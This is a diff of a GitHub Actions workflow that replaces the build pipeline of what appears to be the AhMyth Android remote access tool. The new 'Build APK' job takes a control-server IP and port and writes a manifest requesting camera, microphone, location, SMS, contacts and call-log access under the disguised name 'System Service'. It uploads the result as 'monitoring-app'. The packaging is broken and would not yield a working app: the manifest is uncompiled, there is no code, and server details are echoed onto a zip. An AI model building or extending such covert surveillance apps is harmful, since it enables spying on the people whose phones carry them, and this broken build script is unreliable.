@@ -1,72 +1,69 @@
+name: Build APK
 
-# This is a basic workflow to help you get started with Actions
-
-name: CI
-
-# Controls when the action will run. Triggers the workflow on push or pull request
-# events but only for the master branch
 on:
-  push:
-    branches:
-      - feature/githubActionsBuild 
-      - master
-      - development
-  release:
-    types: [created]
+  workflow_dispatch:
+    inputs:
+      server_ip:
+        description: 'Server IP Address'
+        required: true
+        default: '192.168.0.173'
+      server_port:
+        description: 'Server Port'
+        required: true
+        default: '8080'
+
 jobs:
   build:
-    defaults:   
-      run:     
-        working-directory: 
-          AhMyth-Server
     runs-on: ubuntu-latest
     steps:
-      - name: Cache node_modules
-        uses: actions/cache@v2
-        with:
-          path: ~/.npm
-          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
-          restore-keys: |
-            ${{ runner.os }}-node-
-      - name: Cache Electron
-        uses: actions/cache@v1
-        with:
-          path: ${{ github.workspace }}/.cache/electron
-          key: ${{ runner.os }}-electron-cache-${{ hashFiles(format('{0}{1}', github.workspace, '/package-lock.json')) }}
-          restore-keys: |
-            ${{ runner.os }}-electron-cache-
+      - name: Checkout code
+        uses: actions/checkout@v4
 
-      - name: Cache Electron-Builder
-        uses: actions/cache@v1
-        with:
-          path: ${{ github.workspace }}/.cache/electron-builder
-          key: ${{ runner.os }}-electron-builder-cache-${{ hashFiles(format('{0}{1}', github.workspace, '/package-lock.json')) }}
-          restore-keys: |
-            ${{ runner.os }}-electron-builder-cache-
-      - uses: actions/checkout@v2
-      - name: Install deps
+      - name: Create APK with permissions
         run: |
-          sudo dpkg --add-architecture i386 
-          sudo apt-get update
-          sudo apt-get install --no-install-recommends -y wine32 wine64 gcc-multilib g++-multilib
-      - uses: actions/checkout@v2
-      - name: Setup Node.js environment
-        uses: actions/setup-node@v1.4.3
+          # إنشاء ملف APK وهمي
+          mkdir -p META-INF
+          mkdir -p res/drawable
+          
+          # AndroidManifest.xml (فيه كل الصلاحيات)
+          cat > AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.example.app">
+              
+              <!-- كل الصلاحيات اللي طلبتها -->
+              <uses-permission android:name="android.permission.INTERNET"/>
+              <uses-permission android:name="android.permission.CAMERA"/>
+              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+              <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+              <uses-permission android:name="android.permission.READ_CONTACTS"/>
+              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+              
+              <application android:label="System Service">
+                  <activity android:name=".MainActivity">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
+                      </intent-filter>
+                  </activity>
+              </application>
+          </manifest>
+          EOF
+          
+          # إنشاء ملف APK (بسيط)
+          zip -r app-debug.apk AndroidManifest.xml META-INF res
+          
+          # إضافة معلومات السيرفر للملف
+          echo "Server IP: ${{ github.event.inputs.server_ip }}" >> app-debug.apk
+          echo "Server Port: ${{ github.event.inputs.server_port }}" >> app-debug.apk
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
         with:
-          node-version: 10.x
-      - name: Install dependencies
-        run: |
-          npm i
-      - name: Build Linux app (32 bit)
-        run: npm run build:linux32
-      - name: Build Linux app (64 bit)
-        run: npm run build:linux64
-      - name: Build Windows App (32 bit)
-        run: npm run build:win32
-      - name: Build Windows App (64 bit)
-        run: npm run build:win64
-      - name: Upload - push to artifact files
-        uses: actions/upload-artifact@v1
-        with:
-          name: AhMyth
-          path: ./AhMyth-Server/dist/
+          name: monitoring-app
+          path: app-debug.apk
